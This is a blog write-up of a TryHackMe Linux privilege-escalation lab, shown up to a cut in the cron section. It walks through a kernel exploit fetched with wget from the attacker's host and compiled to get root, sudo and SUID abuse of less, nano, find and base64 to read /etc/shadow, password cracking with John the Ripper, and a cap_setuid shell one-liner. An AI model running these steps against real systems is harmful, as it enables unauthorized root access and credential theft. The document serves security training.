<!doctype html><html lang="en" data-mode="light"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7"><meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"><meta name="viewport" content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover" ><meta name="generator" content="Jekyll v4.3.3" /><meta property="og:title" content="TryHackMe: Linux Privilege Escalation" /><meta property="og:locale" content="en" /><meta name="description" content="https://tryhackme.com/room/linprivesc" /><meta property="og:description" content="https://tryhackme.com/room/linprivesc" /><link rel="canonical" href="/tryhackme-linux-privilege-escalation/" /><meta property="og:url" content="/tryhackme-linux-privilege-escalation/" /><meta property="og:site_name" content="Joe Miller" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2023-07-03T00:00:00-07:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="TryHackMe: Linux Privilege Escalation" /><meta name="twitter:site" content="@" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2023-07-03T00:00:00-07:00","datePublished":"2023-07-03T00:00:00-07:00","description":"https://tryhackme.com/room/linprivesc","headline":"TryHackMe: Linux Privilege Escalation","mainEntityOfPage":{"@type":"WebPage","@id":"/tryhackme-linux-privilege-escalation/"},"url":"/tryhackme-linux-privilege-escalation/"}</script><title>TryHackMe: Linux Privilege Escalation | Joe Miller</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Joe Miller"><meta name="application-name" content="Joe Miller"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.25.0/dist/tocbot.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"><body><aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end"><header class="profile-wrapper"> <a href="/" id="avatar" class="rounded-circle"><img src="/assets/profile.jpg" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a><h1 class="site-title"> <a href="/">Joe Miller</a></h1><p class="site-subtitle fst-italic mb-0"></p></header><nav class="flex-column flex-grow-1 w-100 ps-0"><ul class="nav"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags"></i> <span>TAGS</span> </a></ul></nav><div class="sidebar-bottom d-flex flex-wrap align-items-center w-100"> <a href="https://www.linkedin.com/in/jmillerinfosec/" aria-label="linkedin" target="_blank" rel="noopener noreferrer" > <i class="fab fa-linkedin"></i> </a> <a href="javascript:open('mailto:' + ['millerjb','alumni.uci.edu'].join('@'))" aria-label="email" > <i class="fas fa-envelope"></i> </a></div></aside><div id="main-wrapper" class="d-flex justify-content-center"><div class="container d-flex flex-column px-xxl-5"><header id="topbar-wrapper" aria-label="Top Bar"><div id="topbar" class="d-flex align-items-center justify-content-between px-lg-3 h-100" ><nav id="breadcrumb" aria-label="Breadcrumb"> <span> <a href="/"> Home </a> </span> <span>TryHackMe: Linux Privilege Escalation</span></nav><button type="button" id="sidebar-trigger" class="btn btn-link"> <i class="fas fa-bars fa-fw"></i> </button> <button type="button" id="search-trigger" class="btn btn-link"> <i class="fas fa-search fa-fw"></i> </button> <search class="align-items-center ms-3 ms-lg-0"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..." > </search> <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button></div></header><div class="row flex-grow-1"><main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4"><article class="px-1"><header><h1 data-toc-skip>TryHackMe: Linux Privilege Escalation</h1><div class="post-meta text-muted"> <span> <time data-ts="1688367600" data-df="ll" data-bs-toggle="tooltip" data-bs-placement="bottom" > Jul 3, 2023 </time> </span><div class="post-tags"> <i class="fa fa-tags fa-fw me-1"></i> <a href="/tags/write-up/" class="post-tag no-text-decoration" >write-up</a></div><div class="d-flex justify-content-between"> <span> <em> </em> </span></div></div></header><div class="content"><p><em><a href="https://tryhackme.com/room/linprivesc" target="_blank">https://tryhackme.com/room/linprivesc</a></em></p><h2 id="enumeration"><span class="me-2">Enumeration</span><a href="#enumeration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Commands that can be used to collect information about a Linux system.</p><h4 id="hostname"><span class="me-2">Hostname</span><a href="#hostname" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>karen@wade7363:/$ hostname
wade****
</pre></table></code></div></div><h4 id="linux-kernel-version"><span class="me-2">Linux kernel version</span><a href="#linux-kernel-version" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>karen@wade7363:/$ uname -a
Linux wade7363 3.**.*-**-******* #46-Ubuntu
GNU/Linux
</pre></table></code></div></div><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>karen@wade7363:/$ cat /proc/version
Linux version 3.**.*-**-******* (buildd@panlong)
-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014
</pre></table></code></div></div><h4 id="linux-distro-version"><span class="me-2">Linux distro version</span><a href="#linux-distro-version" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>karen@wade7363:/$ cat /etc/os-release
NAME="Ubuntu"
VERSION="**.**, ****** ****"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu **.** LTS"
VERSION_ID="**.**"
</pre></table></code></div></div><h4 id="python-version"><span class="me-2">Python version</span><a href="#python-version" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>karen@wade7363:/$ python --version
Python *.*.*
</pre></table></code></div></div><h4 id="find-a-vulnerability"><span class="me-2">Find a vulnerability</span><a href="#find-a-vulnerability" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>$ searchsploit linux kernel 3.13.0-24 --cve --exclude="(PoC)|/dos/"
Linux Kernel 3.13.0 &lt; 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation | linux/local/37292.c

$ searchsploit -p 37292
Exploit: Linux Kernel 3.13.0 &lt; 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation
URL: https://www.exploit-db.com/exploits/37292
Path: /opt/homebrew/opt/exploitdb/share/exploitdb/exploits/linux/local/37292.c
Codes: CVE-****-****
</pre></table></code></div></div><h2 id="kernel-exploits"><span class="me-2">Kernel Exploits</span><a href="#kernel-exploits" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>This task involves using a kernel exploit to read a flag.</p><h4 id="use-a-kernel-exploit"><span class="me-2">Use a kernel exploit</span><a href="#use-a-kernel-exploit" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>┌──(user㉿host1)-[~/Downloads]
└─$ sudo python3 -m http.server                 
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.69.129 - - [05/Jul/2023 17:44:26] "GET /37292.c HTTP/1.1" 200 -
</pre></table></code></div></div><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>karen@wade7363:/tmp$ wget 10.2.53.143:8000/37292.c
--2023-07-05 20:44:26--  http://10.2.53.143:8000/37292.c
Connecting to 10.2.53.143:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5119 (5.0K) [text/x-csrc]
Saving to: ‘37292.c’

100%[=========================================================================&gt;] 5,119 --.-K/s   in 0s      

2023-07-05 20:44:26 (514 MB/s) - ‘37292.c’ saved [5119/5119]
</pre></table></code></div></div><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>karen@wade7363:/tmp$ gcc -o ofs 37292.c

karen@wade7363:/tmp$ ./ofs
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# bash
root@wade7363:/tmp#
</pre></table></code></div></div><h4 id="find-flag"><span class="me-2">Find flag</span><a href="#find-flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>root@wade7363:/tmp# find / -name flag*txt             
/home/matt/flag1.txt

root@wade7363:/tmp# cat /home/matt/flag1.txt
THM-**************
</pre></table></code></div></div><h2 id="sudo"><span class="me-2">Sudo</span><a href="#sudo" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Use <code class="language-plaintext highlighter-rouge">sudo -l</code> to check the current user’s sudo permissions. Refer to <a href="https://gtfobins.github.io/" target="_blank">https://gtfobins.github.io/</a> for ways to escalate privileges when the current user has sudo rights to a particular application. This task involves abusing sudo rights of the current user to escalate privileges and read a flag.</p><h4 id="check-sudo-permissions"><span class="me-2">Check sudo permissions</span><a href="#check-sudo-permissions" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>karen@ip-10-10-9-126:/$ sudo -l
Matching Defaults entries for karen on ip-10-10-9-126:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User karen may run the following commands on ip-10-10-9-126:
    (ALL) NOPASSWD: /usr/bin/find
    (ALL) NOPASSWD: /usr/bin/less
    (ALL) NOPASSWD: /usr/bin/nano
</pre></table></code></div></div><h4 id="find-flag-1"><span class="me-2">Find flag</span><a href="#find-flag-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>karen@ip-10-10-9-126:/$ find / -name "flag2.txt" 2&gt;/dev/null
/home/ubuntu/flag2.txt

karen@ip-10-10-9-126:/$ cat /home/ubuntu/flag2.txt
THM-*********
</pre></table></code></div></div><h4 id="read-password-hash-using-less"><span class="me-2">Read password hash using less</span><a href="#read-password-hash-using-less" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>karen@ip-10-10-9-126:/$ sudo less -F /etc/shadow | grep frank
frank:$6$*********************************************************************:18796:0:99999:7:::
</pre></table></code></div></div><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>karen@ip-10-10-9-126:/$ sudo less /etc/profile
[within less: !/bin/sh]
# whoami
root
# cat /etc/shadow | grep frank
frank:$6$*********************************************************************:18796:0:99999:7:::
</pre></table></code></div></div><h4 id="read-password-hash-using-nano"><span class="me-2">Read password hash using nano</span><a href="#read-password-hash-using-nano" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>karen@ip-10-10-9-126:/$ sudo nano /etc/shadow
[then copy paste from within nano]
</pre></table></code></div></div><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>sudo nano
[within nano: ctrl+R then ctrl+X then: reset; sh 1&gt;&amp;0 2&gt;&amp;0]
# whoami
root
# cat /etc/shadow | grep frank
frank:$6$*********************************************************************:18796:0:99999:7:::
</pre></table></code></div></div><h4 id="read-password-hash-using-find"><span class="me-2">Read password hash using find</span><a href="#read-password-hash-using-find" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>karen@ip-10-10-9-126:/$ sudo find . -exec /bin/sh \; -quit
# whoami
root
# cat /etc/shadow | grep frank
frank:$6$*********************************************************************:18796:0:99999:7:::
</pre></table></code></div></div><h2 id="suid"><span class="me-2">SUID</span><a href="#suid" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>SUID (Set-user Identification) allows files to be executed with the permission level of the file owner. SGID (Set-group Identification) allows files to be executed with the permission level of the group owner. If a binary has the SUID bit set, it can potentially be used to access files inaccessible to the current user or to escalate privileges. Refer to <a href="https://gtfobins.github.io/" target="_blank">https://gtfobins.github.io/</a> for ways to escalate privileges when the current user can run a binary with the SUID bit set.</p><p>This task involves abusing a binary with the SUID bit set to escalate privileges and read a flag.</p><h4 id="find-binaries-with-suid-bit-set"><span class="me-2">Find binaries with SUID bit set</span><a href="#find-binaries-with-suid-bit-set" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>karen@ip-10-10-37-191:/$ find / -perm -u=s -type f 2&gt;/dev/null
...
/usr/bin/base64
...
</pre></table></code></div></div><h4 id="abuse-suid-bit-to-read-shadow-file"><span class="me-2">Abuse SUID bit to read shadow file</span><a href="#abuse-suid-bit-to-read-shadow-file" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>karen@ip-10-10-37-191:/$ base64 /etc/shadow | base64 --decode
...
***********:$6$****************************************************************************************************:18796:0:99999:7:::
...
</pre></table></code></div></div><h4 id="use-unshadow-to-prepare-to-crack"><span class="me-2">Use unshadow to prepare to crack</span><a href="#use-unshadow-to-prepare-to-crack" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>┌──(user㉿host1)-[~/Downloads]
└─$ unshadow passwd.txt shadow.txt  
...
***********:$6$****************************************************************************************************:1001:1001::/home/***********:/bin/sh
user2:$6$m6VmzKTbzCD/.I10$cKOvZZ8/rsYwHd.pE099ZRwM686p/Ep13h7pFMBCG4t7IukRqc/fXlA1gHXh9F2CbwmD4Epi1Wgh.Cl.VV1mb/:1002:1002::/home/user2:/bin/sh
lxd:!:998:100::/var/snap/lxd/common/lxd:/bin/false
karen:$6$VjcrKz/6S8rhV4I7$yboTb0MExqpMXW0hjEJgqLWs/jGPJA7N/fEoPMuYLY1w16FwL7ECCbQWJqYLGpy.Zscna9GILCSaNLJdBP1p8/:1003:1003::/ho
...
</pre></table></code></div></div><h4 id="use-john-the-ripper-to-crack"><span class="me-2">Use John the Ripper to crack</span><a href="#use-john-the-ripper-to-crack" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre>┌──(user㉿host1)-[~/Downloads]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt passwords.txt   
Warning: detected hash type "sha512crypt", but the string is also recognized as "HMAC-SHA256"
Use the "--format=HMAC-SHA256" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 ASIMD 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
*********        (karen)     
*********        (user2)     
test123          (***********)     
3g 0:00:00:13 DONE (2023-07-06 00:47) 0.2248g/s 1324p/s 1861c/s 1861C/s paramedic..ellie123
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
</pre></table></code></div></div><h4 id="find-and-read-flag"><span class="me-2">Find and read flag</span><a href="#find-and-read-flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>karen@ip-10-10-52-126:/<span class="nv">$ </span>find / <span class="nt">-name</span> <span class="s2">"flag3.txt"</span> 2&gt;/dev/null
/home/ubuntu/flag3.txt
karen@ip-10-10-52-126:/<span class="nv">$ </span><span class="nb">cat</span> /home/ubuntu/flag3.txt
<span class="nb">cat</span>: /home/ubuntu/flag3.txt: Permission denied
karen@ip-10-10-52-126:/<span class="nv">$ </span><span class="nb">base64</span> /home/ubuntu/flag3.txt | <span class="nb">base64</span> <span class="nt">--decode</span>
THM-<span class="k">*******</span>
</pre></table></code></div></div><h2 id="capabilities"><span class="me-2">Capabilities</span><a href="#capabilities" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Capabilities provides a way for sysadmins to manage privileges more granularly. Use <code class="language-plaintext highlighter-rouge">getcap -r / 2&gt;/dev/null</code> to list enabled capabilities. Refer to <a href="https://gtfobins.github.io/" target="_blank">https://gtfobins.github.io/</a> for ways to escalate privileges when the current user has enabled capabilities.</p><h4 id="use-getcap-to-list-enabled-capabilities"><span class="me-2">Use getcap to list enabled capabilities</span><a href="#use-getcap-to-list-enabled-capabilities" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>karen@ip-10-10-184-172:~$ getcap -r / 2&gt;/dev/null
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep
/home/karen/vim = cap_setuid+ep
/home/ubuntu/view = cap_setuid+ep
</pre></table></code></div></div><h4 id="abuse-cap_setuid-to-gain-root"><span class="me-2">Abuse cap_setuid to gain root</span><a href="#abuse-cap_setuid-to-gain-root" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>karen@ip-10-10-184-172:~$ /home/ubuntu/view -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'

# bash
root@ip-10-10-184-172:~# find / -name "flag4.txt"
/home/ubuntu/flag4.txt
root@ip-10-10-184-172:~# cat /home/ubuntu/flag4.txt
THM-*******
</pre></table></code></div></div><h2 id="cron-jobs"><span class="me-2">Cron Jobs</span><a href="#cron-jobs" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Cron jobs by default run with the privilege of their owners. If a scheduled task runs with root privileges and we can change the script that will be run, that script will run with root privileges. See the system-wide cron jobs <code class="language-plaintext highlighter-rouge">cat /etc/crontab</code></p><h4 id="find-cronjob-owned-by-root"><span class="me-2">Find cronjob owned by root</span><a href="#find-cronjob-owned-by-root" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre>karen@ip-10-10-6-10:~$ cat /etc/crontab
...
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )
#
* * * * *  root /antivirus.sh
* * * * *  root antivirus.sh
* * * * *  root /home/karen/backup.sh
* * * * *  root /tmp/test.py
...
</pre></table></code></div></div><h4 id="find-cronjob-writable-by-current-user"><span class="me-2">Find cronjob writable by current user</span><a href="#find-cronjob-writable-by-current-user" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>karen@ip-10-10-6-10:~$ cat /home/karen/backup.sh
#!/bin/bash
cd /home/admin/1/2/3/Results
zip -r /home/admin/download.zip ./*
